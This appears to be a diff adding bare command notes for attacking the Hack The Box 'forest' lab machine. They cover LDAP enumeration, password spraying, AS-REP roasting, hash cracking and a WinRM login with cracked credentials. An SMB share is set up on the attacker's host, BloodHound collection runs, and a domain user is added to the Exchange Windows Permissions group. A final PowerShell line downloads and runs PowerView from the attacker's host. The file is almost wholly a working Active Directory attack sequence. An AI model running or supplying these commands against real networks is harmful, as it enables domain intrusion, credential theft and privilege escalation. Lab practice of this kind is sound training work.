@@ -1,0 +1,45 @@
+ldapsearch -h 10.10.10.161 -x -s base namingcontexts
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local"
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" > ldapanon.out
+
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=user)' sAMAccountName | grep>
+
+crackmapexec smb 10.10.10.161 -u /home/npe/Documents/HTB/lab/forest/userlist.txt -p /usr/shar>
+
+for i in $(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > t
+
+hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/has>
+
+python3 GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'
+
+hashcat -m 18200 svcalfrescohash.txt /usr/share/wordlists/rockyou.txt.gz -r /usr/share/hashca>
+
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+
+sudo impacket-smbserver test $(pwd) -smb2support -user test -password test123
+
+$pass = convertto-securestring 'test123' -AsPlainText -Force
+
+$cred = New-Object System.Management.Automation.PSCredential ('test', $pass)
+
+New-PSDrive -Name test -PSProvider FileSystem -Credential $cred -Root \\10.10.14.3\test
+
+neo4j console
+
+BloodHound --no-sandbox
+
+sharphound.exe....
+
+New-PSDrive -Name test -PSProvider FileSystem -Credential $cred -Root \\10.10.14.3\test
+
+cd test:
+
+.\SharpHound.exe -c all
+
+net user cman CaveFormation /add /domain
+
+net group "Exchange Windows Permissions"
+
+net group "Exchange Windows Permissions" /add cman
+
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/PowerView.ps1')
